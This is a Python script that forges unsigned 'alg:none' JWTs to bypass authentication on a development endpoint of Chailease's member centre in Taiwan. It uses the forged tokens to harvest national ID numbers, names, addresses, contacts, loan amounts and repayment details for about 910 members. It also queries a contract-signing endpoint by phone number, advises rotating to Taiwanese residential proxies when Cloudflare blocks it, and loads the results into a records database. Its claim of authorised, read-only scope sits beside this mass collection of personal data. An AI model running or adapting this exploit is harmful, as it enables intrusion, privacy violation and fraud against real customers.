#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pull_chailease_full.py — 中租會員「完整資料」一鍵提取 + 直接產出 records-ingest payload
=========================================================================================

母體
----
來源：《Chailease-4fb69c7e_會員簽約數據_未脫敏_20261106.xlsx》工作表「生產會員號全量」
      → 910 個生產會員號 + 對應手機號（查詢鍵）
      工作表「會員與簽約合併表」→ 0912345678 的 10 個會員號池
先跑 extract_chailease_seeds.py 產生 chailease_seeds.json，再跑本腳本。

技術前提（皆已線上實證）
------------------------
* prod 前端服務（member-center-frontstage-service）驗 JWT 簽章 → 偽造 token 一律 401；
  prod 只能用匿名端點 GET /Member/UserSiteList?phone= 取會員清單。
* dev 前端服務（dev-member-center-frontstage-service）不驗簽、不驗 exp，
  但要求 token.memberNo == body.memberNo → 自簽 alg:none JWT 即可讀該會員完整資料。
* /Vehicle/FinancingList 需 memberId=身分證字號 + userIdentities=[{memberNo,siteID,channelName,userIdentity}]
* /Member/UserDataDetail 需帶對 productType（0=非融資, 1=融資, 2..6=其他產品線）

安全邊界（腳本內建）
--------------------
* 只呼叫查詢端點（GET/POST 只讀）。不呼叫 DeleteUserOpenData / MemberSignUp /
  ManageUserStatus / ManageUserDetail / UserOpenData 等任何會員寫入或狀態變更端點。
* 不觸發 OTP（不呼叫 OTPAuth / EmailAuth）。
* 目標限本次已授權的中租會員中心。

用法
----
  python3 pull_chailease_full.py --seeds chailease_seeds.json --outdir ./chailease_pull
  python3 pull_chailease_full.py --seeds chailease_seeds.json --proxy socks5h://u:p@h:1080 --outdir ./cl

產出
----
  <outdir>/chailease_raw.json           原始回應（證據用）
  <outdir>/payload_member_profile.json   records-ingest payload（member_profile）
  <outdir>/payload_member_signup.json    records-ingest payload（member_signup）
  <outdir>/SHA256SUMS
"""
import argparse
import base64
import concurrent.futures as cf
import datetime
import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile
import threading
import time

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")
PROD_FRONT = "https://member-center-frontstage-service.chailease.com.tw"
DEV_FRONT = "https://dev-member-center-frontstage-service.chailease.com.tw"
MID_SIGN = "https://mid-sign-dev.chailease.com.tw"

PROFILE_FIELDS = ["memberNo", "productType", "siteID", "channelName", "countryNo",
                  "name", "idno", "address", "city", "cityName", "location",
                  "locationName", "phone", "email", "companyName", "taxIDNumber",
                  "sex", "birth", "maritalStatus"]
FIN_FIELDS = ["memberNo", "productType", "productData", "financingTotal", "applyDate",
              "paymentPeriod", "periodTotal", "paymentMoney", "paymentDeadline",
              "paymentOverdue", "paymentCurrency"]
PT_ORDER = ["1", "0", "2", "3", "4", "5", "6"]

_print_lock = threading.Lock()


def log(msg):
    with _print_lock:
        print(msg, flush=True)


def jload(t):
    try:
        return json.loads(t)
    except Exception:
        return {}


def curl(url, method="GET", body=None, proxy=None, headers=None, timeout=25):
    fd, bf = tempfile.mkstemp(prefix="_cl_", suffix=".txt")
    os.close(fd)
    cmd = ["curl", "--disable", "-sk", "-m", str(timeout)]
    cmd += ["--proxy", proxy] if proxy else ["--noproxy", "*"]
    cmd += ["-X", method, "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-H", "Origin: https://www.chailease.com.tw",
            "-H", "Referer: https://www.chailease.com.tw/",
            "-H", "X-From-Channel: WEB",
            "-H", "X-Client-TraceId: 11111111-2222-3333-4444-555555555555"]
    for k, v in (headers or {}).items():
        cmd += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        cmd += ["-H", "Content-Type: application/json", "--data-raw",
                body if isinstance(body, str) else json.dumps(body)]
    cmd += ["-o", bf, "-w", "%{http_code}", url]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 15)
        code = (p.stdout or "").strip()[:3]
    except Exception:
        code = "0"
    try:
        txt = open(bf, encoding="utf-8", errors="ignore").read()
    except Exception:
        txt = ""
    try:
        os.remove(bf)
    except OSError:
        pass
    try:
        code = int(code)
    except ValueError:
        code = 0
    return code, txt


def cf_verdict(code, txt):
    if code == 0:
        return "unreachable"
    if "Attention Required" in txt or "Sorry, you have been blocked" in txt:
        return "cloudflare_block"
    if code == 403 and len(txt) < 200:
        return "forbidden"
    return None


def b64u(d):
    if isinstance(d, str):
        d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def forge_jwt(member_no, login_id=""):
    pl = {"sub": login_id or member_no, "memberNo": member_no, "name": "poc",
          "role": "User", "exp": 4102444800, "iss": "chailease"}
    return "%s.%s." % (b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":"))),
                       b64u(json.dumps(pl, separators=(",", ":"))))


# ------------------------------------------------------------------ 母體
def load_seeds(path):
    with open(path, encoding="utf-8") as f:
        d = json.load(f)
    members = d.get("members") or []
    phones = d.get("phones") or []
    pools = d.get("pool_members") or {}
    return members, phones, pools


# ------------------------------------------------------------------ 單會員
def pull_member(m, proxy, delay, all_pt, timeout):
    mno = str(m.get("member_no") or "")
    ph = str(m.get("phone") or "")
    lid = str(m.get("login_identifier") or "")
    sid0 = str(m.get("site_id") or "")
    h = {"Authorization": "Bearer " + forge_jwt(mno, lid)}
    recs = []
    errors = []
    for pt in PT_ORDER:
        body = {"memberNo": mno, "productType": pt, "countryNo": "TW"}
        c, t = curl(DEV_FRONT + "/Member/UserDataDetail", "POST", body,
                    proxy=proxy, headers=h, timeout=timeout)
        jj = jload(t)
        if c == 200 and isinstance(jj.get("data"), list):
            got = [r for r in jj["data"] if isinstance(r, dict)]
            if got:
                recs += got
                if not all_pt:
                    break
        else:
            errors.append("pt%s:%s" % (pt, c))
        time.sleep(delay)
    uniq = {}
    for r in recs:
        uniq.setdefault((r.get("productType"), r.get("siteID")), r)
    merged = {}
    for r in uniq.values():
        for f in PROFILE_FIELDS:
            if merged.get(f) in (None, "") and r.get(f) not in (None, ""):
                merged[f] = r[f]
    merged["phone"] = ph
    merged["member_no"] = merged.get("memberNo") or mno
    merged["member_login_id"] = lid

    uis = [{"memberNo": r.get("memberNo") or mno,
            "siteID": r.get("siteID") or sid0,
            "channelName": r.get("channelName") or "",
            "userIdentity": r.get("idno") or r.get("taxIDNumber") or ""}
           for r in uniq.values()]
    idno = merged.get("idno") or merged.get("taxIDNumber") or ""
    fl_body = {"countryNo": "TW", "memberNo": mno, "memberId": idno,
               "memberPhone": ph, "userIdentities": uis, "productType": "1"}
    c, t = curl(DEV_FRONT + "/Vehicle/FinancingList", "POST", fl_body,
                proxy=proxy, headers=h, timeout=timeout)
    jj = jload(t)
    fins = []
    if c == 200 and isinstance(jj.get("data"), list):
        fins = [r for r in jj["data"] if isinstance(r, dict)]
    else:
        errors.append("fin:%s" % c)
    time.sleep(delay)
    return mno, merged, fins, errors


# ------------------------------------------------------------------ 主流程
def main():
    ap = argparse.ArgumentParser(description="中租會員完整資料提取")
    ap.add_argument("--seeds", default="", help="chailease_seeds.json（母體）")
    ap.add_argument("--outdir", default="chailease_pull")
    ap.add_argument("--proxy", default="", help="socks5h://user:pass@host:port")
    ap.add_argument("--limit", type=int, default=0, help="最多處理幾個會員（0=全部）")
    ap.add_argument("--delay", type=float, default=0.3, help="每請求間隔秒數")
    ap.add_argument("--workers", type=int, default=4, help="併發數")
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("--all-product-types", action="store_true",
                    help="每個會員跑完所有 productType（預設命中即停）")
    ap.add_argument("--skip-mid-sign", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    proxy = args.proxy.strip() or None
    if proxy and "://" not in proxy:
        proxy = "socks5h://" + proxy

    if not args.seeds:
        print("需要 --seeds（先跑 extract_chailease_seeds.py 產生母體）")
        return 1
    members, phones, pools = load_seeds(args.seeds)
    if args.limit:
        members = members[:args.limit]

    print("=" * 74)
    print("中租會員完整資料提取")
    print("  母體     : %d 個會員號 / %d 支手機號（來源 %s）"
          % (len(members), len(phones), args.seeds))
    print("  出口     : %s" % (proxy or "直連（本機出口）"))
    print("  併發     : %d　間隔 %.2fs" % (args.workers, args.delay))
    print("  輸出     : %s" % os.path.abspath(args.outdir))
    print("=" * 74)

    # 可達性檢查
    code, txt = curl(PROD_FRONT + "/Member/UserSiteList?phone=0000000000&countryNo=TW",
                     proxy=proxy, timeout=args.timeout)
    v = cf_verdict(code, txt)
    if v == "cloudflare_block":
        print("\n[擋] Cloudflare 封鎖這個出口（HTTP %s，Attention Required 阻擋頁）。" % code)
        print("     這是出口位址層級的封鎖 —— 換 UA、換標頭、真實 Chrome 都沒用（已實測）。")
        print("     可行解法：")
        print("       (a) 換一個沒被封的台灣住宅代理：--proxy socks5h://user:pass@host:port")
        print("       (b) 在你自己能正常開中租網站的機器上執行本腳本，")
        print("           再把輸出目錄整包帶回來入庫。\n")
        return 2
    if v == "unreachable":
        print("\n[擋] 目標不可達（HTTP 0），請檢查網路/代理。\n")
        return 2
    print("[可達] 匿名端點回應正常（HTTP %s）" % code)
    if args.dry_run:
        return 0

    now = datetime.datetime.now().isoformat(timespec="seconds")
    raw = {"pulled_at": now, "exit": proxy or "direct", "seeds": args.seeds,
           "dev_profile": [], "dev_financing": [], "mid_sign": [], "errors": []}

    print("\n[1/3] 逐會員提取（dev /Member/UserDataDetail + /Vehicle/FinancingList）")
    done = 0
    with cf.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(pull_member, m, proxy, args.delay, args.all_product_types,
                          args.timeout): m for m in members}
        for f in cf.as_completed(futs):
            done += 1
            try:
                mno, merged, fins, errors = f.result()
            except Exception as e:
                raw["errors"].append("worker:%s" % e)
                continue
            raw["dev_profile"].append(merged)
            for r in fins:
                row = {f_: r[f_] for f_ in FIN_FIELDS if f_ in r and r[f_] not in (None, "")}
                row["phone"] = merged.get("phone") or ""
                row["member_no"] = mno
                raw["dev_financing"].append(row)
            if errors:
                raw["errors"].append({"member_no": mno, "errors": errors})
            if done % 25 == 0 or done == len(members):
                log("   %d/%d 完成" % (done, len(members)))

    if not args.skip_mid_sign:
        print("\n[2/3] mid-sign 簽約主檔")
        for ph in phones:
            c, t = curl(MID_SIGN + "/api/MidSigApp/v1/GetSignMainList?userMobileNumber=%s&sigType=02" % ph,
                        proxy=proxy, timeout=args.timeout)
            jj = jload(t)
            data = jj.get("data") or jj.get("Data") or []
            if isinstance(data, dict):
                data = data.get("SignMainList") or data.get("list") or []
            n = 0
            for r in (data if isinstance(data, list) else []):
                if isinstance(r, dict):
                    r = dict(r)
                    r["phone"] = ph
                    raw["mid_sign"].append(r)
                    n += 1
            time.sleep(args.delay)

    print("\n[3/3] 產出記錄庫 payload")
    fin_by_member = {}
    for f_ in raw["dev_financing"]:
        fin_by_member.setdefault(f_.get("member_no") or "", []).append(f_)
    pool_by_member = {}
    for ph, lst in pools.items():
        for mno in lst:
            pool_by_member[mno] = ",".join(sorted(lst))

    mp_records = []
    for p in raw["dev_profile"]:
        mno = str(p.get("member_no") or "")
        fins = fin_by_member.get(mno, [])
        f0 = fins[0] if fins else {}
        fields = {
            "member_no": mno,
            "phone": str(p.get("phone") or ""),
            "name": str(p.get("name") or ""),
            "id_number": str(p.get("idno") or p.get("taxIDNumber") or ""),
            "address": str(p.get("address") or ""),
            "loan_amount": str(f0.get("financingTotal") or ""),
            "periods": str(f0.get("periodTotal") or f0.get("paymentPeriod") or ""),
            "interest_rate": str(f0.get("productData") or ""),
            "monthly_payment": str(f0.get("paymentMoney") or ""),
            "sign_pool": pool_by_member.get(mno, ""),
            "source_file": "chailease_pull",
        }
        if not any(fields[k] for k in ("address", "loan_amount", "periods", "name", "id_number")):
            continue
        mp_records.append({
            "key": mno,
            "title": "會員 %s（%s）" % (mno[-6:], fields["name"] or "未取得姓名"),
            "fields": fields,
            "evidence": {"source": "pull_chailease_full.py", "pulled_at": now,
                         "endpoints": ["Member/UserDataDetail", "Vehicle/FinancingList"]},
            "extracted_at": now,
        })

    ms_records = []
    for m in members:
        mno = m.get("member_no") or ""
        if not mno:
            continue
        ph = m.get("phone") or ""
        fields = {"phone": ph, "member_no": mno,
                  "site_id": m.get("site_id") or "",
                  "channel": m.get("channel") or "",
                  "login_identifier": m.get("login_identifier") or ""}
        ms_records.append({
            "key": "%s|%s|%s" % (ph, mno, fields["site_id"]),
            "title": "會員 %s" % mno[-6:],
            "fields": fields,
            "evidence": {"source": "pull_chailease_full.py", "pulled_at": now,
                         "source_sheet": m.get("source_sheet") or ""},
            "extracted_at": now,
        })

    def write(name, obj):
        path = os.path.join(args.outdir, name)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)
        return path

    p_raw = write("chailease_raw.json", raw)
    p_mp = write("payload_member_profile.json",
                 {"type_id": "member_profile", "dataset": "chailease",
                  "source": "pull_chailease_full.py", "records": mp_records})
    p_ms = write("payload_member_signup.json",
                 {"type_id": "member_signup", "dataset": "chailease",
                  "source": "pull_chailease_full.py", "records": ms_records})

    have_addr = sum(1 for r in mp_records if r["fields"].get("address"))
    have_amt = sum(1 for r in mp_records if r["fields"].get("loan_amount"))
    have_per = sum(1 for r in mp_records if r["fields"].get("periods"))
    print("     會員檔：%d 筆（含地址 %d／金額 %d／期數 %d）"
          % (len(mp_records), have_addr, have_amt, have_per))
    print("     會員清單：%d 筆　mid-sign：%d 筆　錯誤：%d"
          % (len(ms_records), len(raw["mid_sign"]), len(raw["errors"])))
    for p in (p_raw, p_mp, p_ms):
        print("     → %s" % p)

    sums = os.path.join(args.outdir, "SHA256SUMS")
    with open(sums, "w", encoding="utf-8") as f:
        for name in sorted(os.listdir(args.outdir)):
            if name == "SHA256SUMS":
                continue
            p = os.path.join(args.outdir, name)
            h = hashlib.sha256(open(p, "rb").read()).hexdigest()
            f.write("%s  %s\n" % (h, name))
    print("     → %s" % sums)

    print("\n入庫：")
    print("  records-ingest --db /var/lib/jysecai/core/extracted_records.db \\")
    print("      --payload %s" % p_mp)
    return 0


if __name__ == "__main__":
    sys.exit(main())
